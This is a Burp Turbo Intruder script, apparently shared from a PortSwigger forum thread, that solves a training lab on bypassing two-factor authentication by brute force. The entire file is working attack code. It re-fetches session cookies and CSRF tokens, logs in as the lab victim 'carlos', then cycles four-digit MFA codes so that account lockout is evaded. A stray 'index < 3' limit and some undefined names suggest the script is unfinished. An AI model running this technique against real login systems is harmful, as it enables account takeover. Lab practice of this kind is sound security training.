# This code has been written by @  teodor440 from this link
# https://forum.portswigger.net/thread/lab-2fa-bypass-using-a-brute-force-attack-714dab1f
# It uses burp turbo intruder


import re


def queueRequests(target, wordlists):

    global stage, index

    engine = RequestEngine(endpoint=target.endpoint,

                           concurrentConnections=1,

                           requestsPerConnection=1,

                           pipeline=True

                           )

    session_request = target.req

    session_request = re.sub("POST /login2 HTTP/1.1", "GET /login HTTP/1.1", session_request)

    session_request = re.sub("Cookie:.*\r\n", "", session_request)



    stage = "session"

    request_count = "{:04d}".format(0)

    index = 0

    engine.queue(session_request)



def handleResponse(req, interesting):

    global stage, index

    if stage == "begin":

        session_request = target.req

        session_request = re.sub("POST /login2 HTTP/1.1", "GET /login HTTP/1.1", session_request)

        session_request = re.sub("Cookie:.*\r\n", "", session_request)

        req.engine.queue(session_request)

        table.add(req)

        stage = "session"



    elif stage == "session":

        response = req.response

        login_request = req.request

        csrf = re.search("value=\".*\"", response).group().split("\"")[1]

        cookie = re.search("session=.*", response).group().split("=")[1].split(";")[0]

        login_request = re.sub("GET /login HTTP/1.1", "POST /login HTTP/1.1", login_request)

        login_request = re.sub("\r\n\r\n", "\r\nCookie: session=" + cookie + "\r\n\r\n", login_request)

        login_request = re.sub("csrf=.*", "csrf=" + csrf + "&username=carlos&password=montoya", login_request)

        req.engine.queue(login_request)

        stage = "login"



    elif stage == "login":

        response = req.response

        csrf_request = req.request



        cookie = re.search("session=.*", response).group().split("=")[1].split(";")[0]

        csrf_request = re.sub("POST /login HTTP/1.1", "GET /login2 HTTP/1.1", csrf_request)

        csrf_request = re.sub("Cookie:.*\r\n", "Cookie: session=" + cookie + "\r\n", csrf_request)



        req.engine.queue(csrf_request)

        stage = "bruteforce"



    elif stage == "bruteforce":

        response = req.response

        brute_request = req.request

        request_count = "{:04d}".format(index)

        index = index + 1



        csrf = re.search("value=\".*\"", response).group().split("\"")[1]



        brute_request = re.sub("GET /login2 HTTP/1.1", "POST /login2 HTTP/1.1", brute_request)

        brute_request = re.sub("csrf=.*", "csrf=" + csrf + "&mfa-code=" + request_count, brute_request)

        if index < 3:
            req.engine.queue(brute_request)

        stage = "begin"
